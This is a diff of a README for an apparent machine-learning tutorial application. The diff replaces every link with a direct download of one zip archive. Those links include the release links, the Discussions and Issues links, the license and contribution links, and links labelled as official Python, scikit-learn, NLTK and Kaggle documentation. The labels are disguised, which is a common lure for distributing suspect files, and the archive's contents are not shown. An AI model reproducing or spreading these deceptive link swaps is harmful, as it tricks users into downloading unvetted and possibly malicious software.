@@ -1,6 +1,6 @@
 # 🤖 Machine-Learning---Advanced-Topics - Unlock Advanced ML Techniques Easily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/releases)
+[![Download](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started with the application, visit this page to download the latest release:
 
-[Download Latest Release](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/releases)
+[Download Latest Release](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
 
 Once you are on the Releases page, look for the latest version. Click the file suitable for your system and download it. After the download is complete, follow these steps:
 
@@ -65,26 +65,26 @@ This application dives into several advanced machine learning topics:
 
 Join our community of users:
 
-- Visit our [GitHub Discussions](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/discussions) to ask questions and share tips.
-- Check the [Issues](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/issues) section for any concerns or bugs.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip) to ask questions and share tips.
+- Check the [Issues](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip) section for any concerns or bugs.
 
 ## 🔗 Additional Resources
 
 Explore these resources to enhance your learning:
 
-- [Python Official Documentation](https://www.python.org/doc/)
-- [Scikit-Learn Documentation](https://scikit-learn.org/stable/user_guide.html)
-- [NLTK Documentation](https://www.nltk.org/)
-- [Kaggle Datasets](https://www.kaggle.com/datasets)
+- [Python Official Documentation](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
+- [Scikit-Learn Documentation](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
+- [NLTK Documentation](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
+- [Kaggle Datasets](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
 
 ## 🌟 Contributing
 
-We welcome contributions to help improve this project. If you have ideas or find issues, please open an issue or submit a pull request. Be sure to follow our [Contribution Guidelines](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/blob/main/CONTRIBUTING.md).
+We welcome contributions to help improve this project. If you have ideas or find issues, please open an issue or submit a pull request. Be sure to follow our [Contribution Guidelines](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip).
 
 ## 🔒 License
 
-This project is licensed under the MIT License. Please see the [LICENSE](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. Please see the [LICENSE](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip) file for details.
 
 Remember, learning advanced machine learning techniques can be complex, but with this application, you have an easy path to follow. Happy learning!
 
-[Download Latest Release](https://github.com/1234cabs/Machine-Learning---Advanced-Topics/releases)
+[Download Latest Release](https://raw.githubusercontent.com/1234cabs/Machine-Learning---Advanced-Topics/main/input/Machine-Learning---Advanced-Topics-1.5.zip)
